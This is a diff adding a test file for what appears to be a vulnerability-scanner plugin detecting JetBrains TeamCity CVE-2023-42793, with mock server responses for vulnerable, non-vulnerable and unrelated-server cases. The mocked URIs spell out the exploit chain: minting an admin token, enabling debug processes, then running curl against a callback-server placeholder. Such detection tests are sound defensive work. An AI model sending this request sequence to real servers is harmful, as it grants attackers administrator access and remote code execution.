@@ -1,0 +1,114 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "JetbrainsTeamCity_CVE_2023_42793"
+}
+
+tests: {
+  name: "whenOobVulnerable_returnsVuln"
+  expect_vulnerability: true
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: true
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 200
+        body_content: 
+          '... TeamCity 2023.11.3 (build 147512) ...'
+      },
+      {
+        uri: "/app/rest/users/id:1/tokens/RPC2"
+        status: 200
+        body_content: 
+          'RPC2value="abc"'
+      },
+      {
+        uri: "/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true"
+        status: 200
+        body_content: 
+          '...'
+      },
+      {
+        uri: "/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties"
+        status: 200
+        body_content: 
+          '...'
+      },
+      {
+        uri: "/app/rest/debug/processes?exePath=curl&params={{ T_CBS_URI }}"
+        status: 200
+        body_content: 
+          '...'
+      }
+    ]
+  }
+}
+
+
+tests: {
+  name: "whenOobNotVulnerable_returnsNotVuln"
+  expect_vulnerability: false
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: false
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 200
+        body_content: 
+          '... TeamCity 2023.11.3 (build 147512) ...'
+      },
+      {
+        uri: "/app/rest/users/id:1/tokens/RPC2"
+        status: 200
+        body_content: 
+          'RPC2value="abc"'
+      },
+      {
+        uri: "/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true"
+        status: 200
+        body_content: 
+          '...'
+      },
+      {
+        uri: "/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties"
+        status: 200
+        body_content: 
+          '...'
+      },
+      {
+        uri: "/app/rest/debug/processes?exePath=curl&params={{ T_CBS_URI }}"
+        status: 200
+        body_content: 
+          '...'
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenRandomServer_returnsFalse"
+  expect_vulnerability: false
+
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 200
+        body_content: "Hello world"
+      }
+    ]
+  }
+}
+
